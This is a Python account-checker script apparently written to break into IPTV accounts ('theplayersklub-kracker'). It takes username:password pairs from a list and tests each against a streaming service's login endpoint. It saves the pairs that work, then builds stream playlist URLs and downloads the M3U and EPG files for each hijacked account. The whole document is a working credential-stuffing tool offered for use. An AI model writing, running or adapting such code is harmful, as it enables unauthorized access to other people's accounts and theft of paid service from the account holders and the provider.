import requests, os
w = open('found.txt', 'a')
x = open('accounts.txt', 'r').read()
if x.find('\n\n') > -1:
	x = x.replace('\n\n', '')
y = x.split('\n')
found = 0
valid = []
for item in y:
	v = item.split(':')
	z = requests.get('http://thepk.co:2086/xmltv.php?username=' + v[0] + '&password=' + v[1] + '&type=m3u_plus&output=ts')
	if z.text == '':
		print(v[0] + ' not valid')
	else:
		print(v[0] + ' is valid')
		w.write(item + '\n')
		found = found + 1
		valid.append(item)
w.close()
print('\n\n===================================\n')
print('Creating data directory...\n\n')
try: os.mkdir('theplayersklub-kracker')
except FileExistsError: pass
os.chdir('theplayersklub-kracker/')
if found > 0:
	u = input('Would you like to parse these accounts for use? (Yes/No)')
	if u.lower() == 'yes' or u.lower() == 'y':
		t = input('URL list, download current files, or both? (URL/DL/Both)')
		if t.lower() == 'url':
			print('opening urllist.txt')
			s = open('urllist.txt', 'w')
			for item in valid:
				r = item.split(':')
				print('writing info for ' + r[0])
				s.write('Account: ' + r[0] + '\nM3U file: http://thepk.co:2086/get.php?username=' + r[0] + '&password=' + r[1] + '&type=m3u_plus&output=ts\nEPG list: http://thepk.co:2086/xmltv.php?username=' + r[0] + '&password=' + r[1] + '&type=m3u_plus&output=ts\n\n=======================\n\n')
			s.close()
		elif t.lower() == 'dl':
			print('In actuality, this will give you outdated results sooner or later. Please just use the URLs, but if you need this for offline viewing, bingo.')
			for item in valid:
				r = item.split(':')
				print('opening folder ' + r[0])
				try: os.mkdir(r[0])
				except FileExistsError: pass
				q = open(r[0] + '/' + r[0] + '.m3u', 'w')
				p = open(r[0] + '/' + r[0] + '_epg.xml', 'w')
				print('downloading m3u for ' + r[0])
				q.write(requests.get('http://thepk.co:2086/get.php?username=' + r[0] + '&password=' + r[1] + '&type=m3u_plus&output=ts').text)
				print('downloading epg for ' + r[0])
				p.write(requests.get('http://thepk.co:2086/xmltv.php?username=' + r[0] + '&password=' + r[1] + '&type=m3u_plus&output=ts').text)
				q.close()
				p.close()
		elif t.lower() == 'both' or t.lower() == 'b':
			print('opening urllist.txt')
			s = open('urllist.txt', 'a')
			for item in valid:
				r = item.split(':')
				print('writing info for ' + r[0])
				s.write('Account: ' + r[0] + '\nM3U file: http://thepk.co:2086/get.php?username=' + r[0] + '&password=' + r[1] + '&type=m3u_plus&output=ts\nEPG list: http://thepk.co:2086/xmltv.php?username=' + r[0] + '&password=' + r[1] + '&type=m3u_plus&output=ts\n\n=======================\n\n')
			s.close()
			for item in valid:
				r = item.split(':')
				print('opening folder ' + r[0])
				try: os.mkdir(r[0])
				except FileExistsError: pass
				q = open(r[0] + '/' + r[0] + '.m3u', 'w')
				p = open(r[0] + '/' + r[0] + '_epg.xml', 'w')
				print('downloading m3u for ' + r[0])
				q.write(requests.get('http://thepk.co:2086/get.php?username=' + r[0] + '&password=' + r[1] + '&type=m3u_plus&output=ts').text)
				print('downloading epg for ' + r[0])
				p.write(requests.get('http://thepk.co:2086/xmltv.php?username=' + r[0] + '&password=' + r[1] + '&type=m3u_plus&output=ts').text)
				q.close()
				p.close()
		else:
			print('option not valid, skipping, rerun to choose again.')
			pass
	elif u.lower() == 'no' or u.lower() == 'n':
		pass
	else:
		print('option not valid, skipping, rerun to choose again.')
		pass
os.chdir('../')
print('Have a good day.')